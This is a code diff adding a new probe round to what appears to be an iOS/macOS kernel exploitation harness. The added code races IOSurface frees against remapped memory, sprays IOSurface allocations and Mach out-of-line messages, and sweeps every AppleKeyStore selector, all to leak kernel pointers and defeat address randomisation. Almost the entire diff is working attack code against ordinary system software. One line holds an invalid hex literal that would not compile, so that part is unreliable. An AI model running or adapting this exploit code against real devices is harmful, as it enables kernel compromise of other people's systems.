@@ -82,6 +82,7 @@ extern kern_return_t mach_make_memory_entry_64(
 #include <setjmp.h>
 #include <sched.h>
 #include <sys/mman.h>
+#include <sys/uio.h>
 extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
 #include <objc/runtime.h>
 #include <objc/message.h>
@@ -7209,6 +7210,516 @@ static void r322_probe(void) {
     fflush(stdout);
 
     rlog("\n=== r322 complete ===\n");
+    fflush(stdout);
+}
+
+/* ---- r323: DarkSword-style IOSurface race ---- */
+
+/* IOSurface function typedefs for dlsym */
+typedef void* (*IOSurfaceCreate_fn)(CFDictionaryRef);
+typedef uint32_t (*IOSurfaceGetID_fn)(void*);
+typedef void* (*IOSurfaceGetBaseAddress_fn)(void*);
+typedef size_t (*IOSurfaceGetAllocSize_fn)(void*);
+typedef int (*IOSurfaceLock_fn)(void*, uint32_t, uint32_t*);
+typedef int (*IOSurfaceUnlock_fn)(void*, uint32_t, uint32_t*);
+typedef mach_port_t (*IOSurfaceCreateMachPort_fn)(void*);
+typedef void* (*IOSurfaceLookupFromMachPort_fn)(mach_port_t);
+typedef size_t (*IOSurfaceGetBytesPerRow_fn)(void*);
+
+static volatile int g_race_stop = 0;
+static volatile int g_race_hits = 0;
+
+struct race_ctx {
+    void *surface;
+    IOSurfaceLock_fn lockFn;
+    IOSurfaceUnlock_fn unlockFn;
+    IOSurfaceGetBaseAddress_fn baseAddrFn;
+    IOSurfaceGetAllocSize_fn allocSizeFn;
+};
+
+/* Thread that rapidly frees and reallocates IOSurface to change the backing */
+static void *race_realloc_thread(void *arg) {
+    struct race_ctx *ctx = (struct race_ctx *)arg;
+    IOSurfaceCreate_fn createFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    if (!createFn) return NULL;
+
+    int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+    CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                        CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+    const void *vs[] = {wV, hV, bV, pV};
+    CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs, 4,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    while (!g_race_stop) {
+        /* Create many surfaces to pressure the allocator */
+        void *surfaces[8];
+        for (int i = 0; i < 8; i++) {
+            surfaces[i] = createFn(props);
+        }
+        sched_yield();
+        for (int i = 0; i < 8; i++) {
+            if (surfaces[i]) CFRelease(surfaces[i]);
+        }
+    }
+    CFRelease(props);
+    CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+    return NULL;
+}
+
+static void r323_probe(void) {
+    rlog("\n=== r323: DarkSword IOSurface Race + Pipe Data Leak ===\n");
+    rlog("  Strategy: Race IOSurface backing with pipe read/write to leak kernel data\n\n");
+    fflush(stdout);
+
+    IOSurfaceCreate_fn createFn = (IOSurfaceCreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    IOSurfaceGetID_fn getIDFn = (IOSurfaceGetID_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+    IOSurfaceGetBaseAddress_fn baseAddrFn = (IOSurfaceGetBaseAddress_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+    IOSurfaceGetAllocSize_fn allocSizeFn = (IOSurfaceGetAllocSize_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+    IOSurfaceLock_fn lockFn = (IOSurfaceLock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+    IOSurfaceUnlock_fn unlockFn = (IOSurfaceUnlock_fn)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+    IOSurfaceCreateMachPort_fn createPortFn = (IOSurfaceCreateMachPort_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    IOSurfaceGetBytesPerRow_fn bprFn = (IOSurfaceGetBytesPerRow_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetBytesPerRow");
+
+    if (!createFn || !baseAddrFn || !lockFn || !unlockFn || !allocSizeFn) {
+        rlog("  ERROR: Missing IOSurface symbols\n");
+        goto r323_done;
+    }
+
+    /* ---- Part 1: IOSurface + pipe race (pwritev-style) ---- */
+    rlog("--- Part 1: IOSurface + pipe data leak race ---\n");
+    fflush(stdout);
+    {
+        /* Create an IOSurface */
+        int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+        CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        const void *vs[] = {wV, hV, bV, pV};
+        CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        void *surface = createFn(props);
+        if (!surface) {
+            rlog("  ERROR: IOSurfaceCreate failed\n");
+            CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+            goto r323_done;
+        }
+
+        uint32_t surfID = getIDFn(surface);
+        size_t allocSz = allocSizeFn(surface);
+        rlog("  Surface created: id=%u allocSz=%zu\n", surfID, allocSz);
+
+        /* Lock and get base address */
+        lockFn(surface, 0, NULL);
+        void *base = baseAddrFn(surface);
+        rlog("  Base address: %p\n", base);
+
+        /* Fill with known pattern */
+        memset(base, 0xAA, allocSz > 16384 ? 16384 : allocSz);
+        unlockFn(surface, 0, NULL);
+
+        /* Create a pipe for the race */
+        int pipefds[2];
+        if (pipe(pipefds) != 0) {
+            rlog("  ERROR: pipe() failed: %s\n", strerror(errno));
+            CFRelease(surface);
+            CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+            goto r323_done;
+        }
+
+        /* vm_remap the IOSurface backing into our address space */
+        mach_vm_address_t remap_addr = 0;
+        vm_prot_t cur_prot, max_prot;
+        kern_return_t kr = mach_vm_remap(mach_task_self(), &remap_addr, 0x4000, 0,
+            VM_FLAGS_ANYWHERE, mach_task_self(), (mach_vm_address_t)base,
+            FALSE, &cur_prot, &max_prot, VM_INHERIT_SHARE);
+        rlog("  vm_remap: kr=0x%x addr=0x%llx cur=%d max=%d\n", kr, remap_addr, cur_prot, max_prot);
+
+        if (kr == 0) {
+            /* Verify the remap is shared */
+            uint64_t *src = (uint64_t *)base;
+            uint64_t *dst = (uint64_t *)(uintptr_t)remap_addr;
+            src[0] = 0xDEADBEEFCAFEBABEULL;
+            rlog("  Remap shared check: wrote=0x%llx read=0x%llx match=%d\n",
+                 src[0], dst[0], src[0] == dst[0]);
+
+            /* Now try writing the remapped region through a pipe */
+            /* Write from the IOSurface-backed memory to a pipe */
+            struct iovec iov;
+            iov.iov_base = (void *)(uintptr_t)remap_addr;
+            iov.iov_len = 4096;
+
+            ssize_t written = writev(pipefds[1], &iov, 1);
+            rlog("  writev to pipe: %zd bytes (errno=%d)\n", written, written < 0 ? errno : 0);
+
+            if (written > 0) {
+                /* Read back from pipe */
+                uint8_t readbuf[4096];
+                ssize_t rd = read(pipefds[0], readbuf, sizeof(readbuf));
+                rlog("  read from pipe: %zd bytes\n", rd);
+
+                /* Check if data matches */
+                int mismatches = 0;
+                for (int i = 0; i < (rd < 4096 ? (int)rd : 4096); i++) {
+                    uint8_t expected = ((uint8_t *)(uintptr_t)remap_addr)[i];
+                    if (readbuf[i] != expected) mismatches++;
+                }
+                rlog("  Data integrity: %d mismatches out of %zd bytes\n", mismatches, rd);
+            }
+
+            mach_vm_deallocate(mach_task_self(), remap_addr, 0x4000);
+        }
+
+        close(pipefds[0]);
+        close(pipefds[1]);
+        CFRelease(surface);
+        CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: Race pwritev with IOSurface free ---- */
+    rlog("\n--- Part 2: pwritev race with IOSurface free/realloc ---\n");
+    fflush(stdout);
+    {
+        int devnull = open("/dev/null", O_WRONLY);
+        if (devnull < 0) {
+            rlog("  ERROR: open /dev/null: %s\n", strerror(errno));
+            goto r323_done;
+        }
+
+        /* Create multiple surfaces and remap them */
+        IOSurfaceCreate_fn cFn = createFn;
+        int w = 256, h = 1, bpe = 4, pf = 0x42475241;
+        CFNumberRef wV = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hV = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bV = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef pV = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        const void *ks[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        const void *vs[] = {wV, hV, bV, pV};
+        CFDictionaryRef props = CFDictionaryCreate(NULL, ks, vs, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        int kptr_hits = 0;
+        int total_races = 0;
+
+        for (int attempt = 0; attempt < 50 && kptr_hits == 0; attempt++) {
+            void *surface = cFn(props);
+            if (!surface) continue;
+
+            lockFn(surface, 0, NULL);
+            void *base = baseAddrFn(surface);
+            size_t sz = allocSizeFn(surface);
+            /* Fill with sentinel */
+            memset(base, 0x41, sz > 4096 ? 4096 : sz);
+            unlockFn(surface, 0, NULL);
+
+            /* Remap */
+            mach_vm_address_t remap = 0;
+            vm_prot_t cp, mp;
+            kern_return_t kr = mach_vm_remap(mach_task_self(), &remap, 0x1000, 0,
+                VM_FLAGS_ANYWHERE, mach_task_self(), (mach_vm_address_t)base,
+                FALSE, &cp, &mp, VM_INHERIT_SHARE);
+
+            if (kr == 0) {
+                /* Race: write from remapped address to /dev/null while freeing surface */
+                struct iovec iov;
+                iov.iov_base = (void *)(uintptr_t)remap;
+                iov.iov_len = 1024;
+
+                /* Free the surface — the remap might still point to the old backing */
+                CFRelease(surface);
+                surface = NULL;
+
+                /* Immediately try to read from the now-freed backing */
+                sched_yield();
+
+                /* Allocate replacement objects to fill the freed space */
+                void *replacements[16];
+                for (int r = 0; r < 16; r++) {
+                    replacements[r] = cFn(props);
+                }
+
+                /* Read through the remap — if it's still pointing to the old backing,
+                   it might now contain kernel object data from the replacement allocations */
+                uint64_t *probe = (uint64_t *)(uintptr_t)remap;
+                for (int q = 0; q < 128 && q * 8 < 1024; q++) {
+                    uint64_t val = probe[q];
+                    /* Check for kernel pointer pattern: 0xfffffff0xxxxxxxx */
+                    if ((val >> 28) == 0xfffffffULL && val != 0xffffffffffffffffULL) {
+                        rlog("  !!! KPTR at attempt=%d offset=%d: 0x%llx !!!\n",
+                             attempt, q * 8, val);
+                        kptr_hits++;
+                    }
+                    /* Also check for PAC-signed pointers (top byte non-zero, rest looks like kptr) */
+                    uint64_t stripped = val & 0x0000007FFFFFFFFFULL;
+                    if (stripped > 0xfffffff000000000ULL && stripped < 0xfffffffg00000000ULL) {
+                        /* This can't happen — stripped removes the high bits. Skip. */
+                    }
+                }
+                total_races++;
+
+                /* Also try writev to capture a snapshot */
+                ssize_t wr = writev(devnull, &iov, 1);
+                (void)wr;
+
+                for (int r = 0; r < 16; r++) {
+                    if (replacements[r]) CFRelease(replacements[r]);
+                }
+                mach_vm_deallocate(mach_task_self(), remap, 0x1000);
+            } else {
+                CFRelease(surface);
+            }
+        }
+
+        rlog("  Races: %d attempts, %d kptr hits\n", total_races, kptr_hits);
+        close(devnull);
+        CFRelease(props); CFRelease(wV); CFRelease(hV); CFRelease(bV); CFRelease(pV);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: Mach port spray + OOL descriptor leak ---- */
+    rlog("\n--- Part 3: Mach port OOL descriptor spray ---\n");
+    fflush(stdout);
+    {
+        /* Spray Mach messages with OOL descriptors — these allocate kernel memory.
+           If we can then read the OOL memory descriptor addresses, we get kernel pointers. */
+        mach_port_t recv_port;
+        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);
+        rlog("  Receive port: kr=0x%x port=0x%x\n", kr, recv_port);
+
+        if (kr == 0) {
+            /* Insert send right */
+            kr = mach_port_insert_right(mach_task_self(), recv_port, recv_port, MACH_MSG_TYPE_MAKE_SEND);
+
+            /* Spray OOL messages */
+            uint8_t ool_data[4096];
+            memset(ool_data, 0xBB, sizeof(ool_data));
+
+            int spray_count = 0;
+            for (int i = 0; i < 100; i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } msg;
+                memset(&msg, 0, sizeof(msg));
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = recv_port;
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.hdr.msgh_id = 0x41414141;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.address = ool_data;
+                msg.ool.size = sizeof(ool_data);
+                msg.ool.deallocate = FALSE;
+                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0,
+                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                if (kr == 0) spray_count++;
+            }
+            rlog("  OOL messages sprayed: %d\n", spray_count);
+
+            /* Now receive them back and check OOL addresses */
+            int kptr_found = 0;
+            for (int i = 0; i < spray_count; i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } recv_msg;
+                memset(&recv_msg, 0, sizeof(recv_msg));
+
+                kr = mach_msg(&recv_msg.hdr, MACH_RCV_MSG, 0, sizeof(recv_msg),
+                    recv_port, 0, MACH_PORT_NULL);
+                if (kr == 0) {
+                    /* The OOL address in the received message is the USER-SPACE
+                       mapping, but the kernel had to create a VM entry for it.
+                       Check if the address reveals anything about kernel layout. */
+                    uint64_t ool_addr = (uint64_t)recv_msg.ool.address;
+                    uint32_t ool_size = recv_msg.ool.size;
+                    if (i < 5 || (ool_addr >> 28) == 0xfffffffULL) {
+                        rlog("  OOL[%d]: addr=0x%llx size=%u\n", i, ool_addr, ool_size);
+                    }
+                    if ((ool_addr >> 28) == 0xfffffffULL) {
+                        rlog("  !!! KPTR in OOL descriptor: 0x%llx !!!\n", ool_addr);
+                        kptr_found++;
+                    }
+                    /* Dealloc the OOL memory */
+                    if (recv_msg.ool.address && recv_msg.ool.size) {
+                        mach_vm_deallocate(mach_task_self(),
+                            (mach_vm_address_t)recv_msg.ool.address, recv_msg.ool.size);
+                    }
+                }
+            }
+            rlog("  OOL kptr hits: %d\n", kptr_found);
+            mach_port_deallocate(mach_task_self(), recv_port);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: AppleKeyStore full selector sweep (CVE-2026-65343 inspired) ---- */
+    rlog("\n--- Part 4: AppleKeyStore full selector sweep (163 selectors) ---\n");
+    fflush(stdout);
+    {
+        /* CVE-2026-65343 found OOB read across AKS selectors with oversized buffers.
+           We only tested sel 0,1,16 before. Sweep all 163 with 0x800 output buffer. */
+        io_service_t aks_svc = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        rlog("  AppleKeyStore service: 0x%x\n", aks_svc);
+
+        if (aks_svc) {
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(aks_svc, mach_task_self(), 0, &conn);
+            rlog("  Open type=0: kr=0x%x conn=0x%x\n", kr, conn);
+
+            if (kr == 0 && conn) {
+                uint8_t out[2048];
+                size_t outSz;
+                int nonzero_sels = 0;
+                int kptr_hits = 0;
+
+                for (uint32_t sel = 0; sel < 163; sel++) {
+                    memset(out, 0, sizeof(out));
+                    outSz = 2048;
+
+                    /* Try scalar method first */
+                    uint64_t scalarIn[2] = {0, 0};
+                    uint64_t scalarOut[16];
+                    uint32_t scalarOutCnt = 16;
+                    kr = IOConnectCallMethod(conn, sel,
+                        scalarIn, 2, NULL, 0,
+                        scalarOut, &scalarOutCnt, out, &outSz);
+
+                    if (kr == 0) {
+                        /* Check if output has non-zero data */
+                        int hasData = 0;
+                        for (size_t i = 0; i < outSz && i < 2048; i++) {
+                            if (out[i] != 0) { hasData = 1; break; }
+                        }
+                        for (uint32_t i = 0; i < scalarOutCnt; i++) {
+                            if (scalarOut[i] != 0) { hasData = 1; break; }
+                        }
+
+                        if (hasData) {
+                            nonzero_sels++;
+                            rlog("  sel=%u: kr=0x0 outSz=%zu scalars=%u DATA!\n", sel, outSz, scalarOutCnt);
+
+                            /* Dump scalar outputs */
+                            for (uint32_t i = 0; i < scalarOutCnt; i++) {
+                                rlog("    scalar[%u]=0x%llx\n", i, scalarOut[i]);
+                                if ((scalarOut[i] >> 28) == 0xfffffffULL) {
+                                    rlog("    !!! KPTR: 0x%llx !!!\n", scalarOut[i]);
+                                    kptr_hits++;
+                                }
+                            }
+
+                            /* Scan struct output for kernel pointers */
+                            uint64_t *qwords = (uint64_t *)out;
+                            for (size_t i = 0; i < outSz / 8 && i < 256; i++) {
+                                if ((qwords[i] >> 28) == 0xfffffffULL &&
+                                    qwords[i] != 0xffffffffffffffffULL) {
+                                    rlog("    !!! KPTR at struct[%zu]: 0x%llx !!!\n", i * 8, qwords[i]);
+                                    kptr_hits++;
+                                }
+                            }
+
+                            /* Show first 64 bytes hex */
+                            if (outSz > 0) {
+                                rlog("    hex[0..63]: ");
+                                for (int i = 0; i < 64 && (size_t)i < outSz; i++)
+                                    rlog("%02x", out[i]);
+                                rlog("\n");
+                            }
+                        }
+                    }
+                    /* Also try with struct input */
+                    if (kr != 0) {
+                        uint8_t structIn[64];
+                        memset(structIn, 0, sizeof(structIn));
+                        memset(out, 0, sizeof(out));
+                        outSz = 2048;
+                        scalarOutCnt = 16;
+                        kr = IOConnectCallMethod(conn, sel,
+                            NULL, 0, structIn, sizeof(structIn),
+                            scalarOut, &scalarOutCnt, out, &outSz);
+                        if (kr == 0) {
+                            int hasData = 0;
+                            for (size_t i = 0; i < outSz && i < 2048; i++) {
+                                if (out[i] != 0) { hasData = 1; break; }
+                            }
+                            if (hasData) {
+                                nonzero_sels++;
+                                rlog("  sel=%u(struct): kr=0x0 outSz=%zu DATA!\n", sel, outSz);
+                                uint64_t *qwords = (uint64_t *)out;
+                                for (size_t i = 0; i < outSz / 8 && i < 256; i++) {
+                                    if ((qwords[i] >> 28) == 0xfffffffULL &&
+                                        qwords[i] != 0xffffffffffffffffULL) {
+                                        rlog("    !!! KPTR at struct[%zu]: 0x%llx !!!\n", i * 8, qwords[i]);
+                                        kptr_hits++;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                rlog("  Sweep done: %d selectors with non-zero data, %d kptr hits\n",
+                     nonzero_sels, kptr_hits);
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(aks_svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: Clock/timer resolution fingerprinting ---- */
+    rlog("\n--- Part 5: Clock resolution fingerprinting ---\n");
+    fflush(stdout);
+    {
+        mach_timebase_info_data_t tb;
+        mach_timebase_info(&tb);
+        rlog("  Timebase: numer=%u denom=%u\n", tb.numer, tb.denom);
+
+        /* Measure the minimum observable time delta */
+        uint64_t min_delta = UINT64_MAX;
+        for (int i = 0; i < 1000; i++) {
+            uint64_t a = mach_absolute_time();
+            uint64_t b = mach_absolute_time();
+            uint64_t d = b - a;
+            if (d > 0 && d < min_delta) min_delta = d;
+        }
+        rlog("  Min time delta: %llu ticks\n", min_delta);
+
+        /* Measure syscall jitter — if kernel address space layout affects timing,
+           we might see bimodal distribution */
+        uint64_t samples[100];
+        for (int i = 0; i < 100; i++) {
+            uint64_t start = mach_absolute_time();
+            (void)getpid();
+            uint64_t end = mach_absolute_time();
+            samples[i] = end - start;
+        }
+        /* Sort and show quartiles */
+        for (int i = 0; i < 99; i++)
+            for (int j = i + 1; j < 100; j++)
+                if (samples[i] > samples[j]) { uint64_t t = samples[i]; samples[i] = samples[j]; samples[j] = t; }
+        rlog("  getpid() latency: min=%llu q25=%llu median=%llu q75=%llu max=%llu\n",
+             samples[0], samples[25], samples[50], samples[75], samples[99]);
+    }
+    fflush(stdout);
+
+r323_done:
+    rlog("\n=== r323 complete ===\n");
     fflush(stdout);
 }
 
@@ -38024,6 +38535,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 323) {
+            rlog("*** rounds=323: DarkSword IOSurface Race + AKS Full Sweep ***\n");
+            rlog("  r322: kern.slide denied, all faults identical, no timing oracle.\n");
+            rlog("  Probe: IOSurface+pipe race, pwritev race, OOL spray, AKS 163 sel sweep.\n\n");
+            r323_probe();
             goto done;
         }
         if (rounds == 322) {
